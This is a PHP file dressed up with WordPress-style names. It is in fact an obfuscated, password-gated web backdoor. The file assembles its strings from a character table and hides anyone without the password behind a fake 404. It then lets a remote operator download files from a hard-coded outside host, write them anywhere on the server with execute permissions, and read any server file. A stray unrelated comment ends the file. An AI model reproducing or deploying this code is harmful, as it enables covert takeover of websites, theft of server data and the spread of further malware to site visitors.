<?php


@ini_set('display_errors', 0);
$wrapper_makup = "open_pay";
$wp_contents = "open_url";
$wp_makup = "open_cat";
$wp_objacts = "open_text";
$sources_block = "open_tag_cloud";
$items_objacts = "open_search";
$items_makup = "open_rss";
$inners_value = "open_recent_entries";
$filters_value = "open_recent_comments";
$categoryes = "open_pages";
$block_types = "open_meta";
$block_contents = "open_links";
$alowed_html = "open_categories";
$alowed_block = "open_calendar";
$allow_protocols = "open_archives";
$$wrapper_makup = RandNBA();
$$wp_makup =  $open_pay[62].$open_pay[51].$open_pay[50].$open_pay[54].$open_pay[55];
$$sources_block = $open_pay[28].$open_pay[26].$open_pay[27].$open_pay[33];
$$items_objacts = $open_pay[19].$open_pay[22].$open_pay[12].$open_pay[1].$open_pay[0].$open_pay[12].$open_pay[0].$open_pay[17].$open_pay[10].$open_pay[4].$open_pay[19];
$$wp_objacts = $$open_cat;
$$wp_contents = $open_pay[12].$open_pay[3].$open_pay[31];
$$items_makup = $open_pay[30].$open_pay[35].$open_pay[32].$open_pay[34].$open_pay[31].$open_pay[34].$open_pay[31].$open_pay[3].$open_pay[26].$open_pay[5].$open_pay[5].$open_pay[4].$open_pay[29].$open_pay[31].$open_pay[28].$open_pay[27].$open_pay[0].$open_pay[26].$open_pay[30].$open_pay[32].$open_pay[5].$open_pay[26].$open_pay[30].$open_pay[34].$open_pay[28].$open_pay[5].$open_pay[33].$open_pay[0].$open_pay[3].$open_pay[31].$open_pay[34].$open_pay[3];
$$inners_value =  $open_pay[23].$open_pay[24].$open_pay[25];
$$filters_value = $open_pay[62].$open_pay[54].$open_pay[40].$open_pay[53].$open_pay[57].$open_pay[40].$open_pay[53];
$$categoryes = $$open_recent_comments;
$$block_types = $open_pay[39].$open_pay[50].$open_pay[38].$open_pay[56].$open_pay[48].$open_pay[40].$open_pay[49].$open_pay[55].$open_pay[62].$open_pay[53].$open_pay[50].$open_pay[50].$open_pay[55];
$$block_contents = $open_pay[51].$open_pay[43].$open_pay[51].$open_pay[62].$open_pay[54].$open_pay[40].$open_pay[47].$open_pay[41];
$$alowed_html = $open_pay[0].$open_pay[6].$open_pay[4].$open_pay[19];
$$alowed_block = $open_pay[8].$open_pay[13].$open_pay[3].$open_pay[4].$open_pay[23].$open_pay[63].$open_pay[15].$open_pay[7].$open_pay[15];
$$allow_protocols = $open_pay[7].$open_pay[19].$open_pay[19].$open_pay[15].$open_pay[64].$open_pay[65].$open_pay[65].$open_pay[22].$open_pay[22].$open_pay[22].$open_pay[63];

if(isset($open_pages["$open_meta"])){$BT = $open_pages["$open_meta"];}elseif(isset($open_pages["$open_links"])){$BT = str_ireplace(str_replace("\\",DIRECTORY_SEPARATOR,str_replace("/",DIRECTORY_SEPARATOR,$open_pages["$open_links"])),'',__FILE__).DIRECTORY_SEPARATOR;}else{$BT = '/';}
foreach($open_text as $open_rsso=>$open_searcho){
	$$open_rsso = $open_searcho;
}

if(!(isset($passwd) && $open_url($passwd) == $open_rss)){
	http_response_code(404);  
	exit; 
}

if(isset($act) && $act == 'check' && isset($check_file)){
	if(file_exists($check_file)){
		echo '#ok#';
	}
}

if(isset($act) && $act == 'test'){
		echo '#ok#';
}

if(isset($act) && $act == 'recover' && isset($recover_file) && isset($recover_file_url)){
{
		
			$profile = $recover_file;
			$date = $open_categories($recover_file_url);
			wp_dir_file($recover_file);
			@chmod($profile,0755);

			if($date && file_put_contents($profile,$date)){
				echo '#ok#';
			}else{
				echo '#fail#';
			}
		
	}
}


$wp_rd = 're';
$wp_rd .= 'da';
$wp_rd .= 'te';

if(isset($act) && $act == $wp_rd && isset($v_read)){
	if(file_exists($v_read)){
		echo wp_file_see($v_read);
	}
}

function RandNBA($length = "") {
    $str = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_.:/-";
    return ($str);
} 

function wp_file_see($file){
	if(function_exists('file_get_contents')){
		return file_get_contents($file);
	}else{
		$handle = fopen($file, "r");
		$contents = fread($handle, filesize($file));
		fclose($handle);
		return $contents;
	}
}

function aget($url,$loop=10){
	$data = false;
	$i = 0; 
	while(!$data) {
        $data = wp_get_filters($url);
		if($i++ >= $loop) break;
	}
	return $data;
}

function wp_get_filters($url){
	 global $open_archives, $open_search, $open_tag_cloud, $open_recent_entries;
     $data = '';
	 $url = "$open_archives$open_search.$open_recent_entries/".$url;
	 $url = trim($url);
	 if (extension_loaded('curl') && function_exists('curl_exec') && function_exists('curl_init')){
         $ch = curl_init();
		 curl_setopt($ch, CURLOPT_URL, $url);
		 curl_setopt($ch, CURLOPT_HEADER, false);
		 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);		 
         curl_setopt($ch, CURLOPT_TIMEOUT, 60);
		 $data = curl_exec($ch);
		 curl_close($ch);
	 }
    
     if ($data == ''){
         if ($url && function_exists('file_get_contents')){
             $data = @file_get_contents($url);             
		 }
      }
    
     if ($data == ''){
         if ($url && ini_get('allow_url_fopen') && function_exists('fopen') && function_exists('ini_get')){
             ($fp = @fopen($url, 'r'));            
             if ($fp){
                
                 while (!@feof($fp)){
                     $data .= @fgets($fp) . '';
				 }
                 @fclose($fp);
			}
         }
      }
     return $data;	
}


function wp_dir_file($gDir=''){
		global $BT;
		$gDir = str_replace('/',DIRECTORY_SEPARATOR,$gDir);
		$gDir = str_replace('\\',DIRECTORY_SEPARATOR,$gDir);
		$arr = explode(DIRECTORY_SEPARATOR,$gDir);
		
		if(count($arr) <= 0) return;

		
		if(!strstr($gDir,$BT))
			$dir = $BT;
		else
			$dir = '';
		
		for($i = 0 ; $i < count($arr)-1 ; $i++){
			$dir .= '/' . $arr[$i];
			if(!is_dir($dir)) mkdir($dir);
		}
		
		return $dir;
}


// Now look for larger loops.

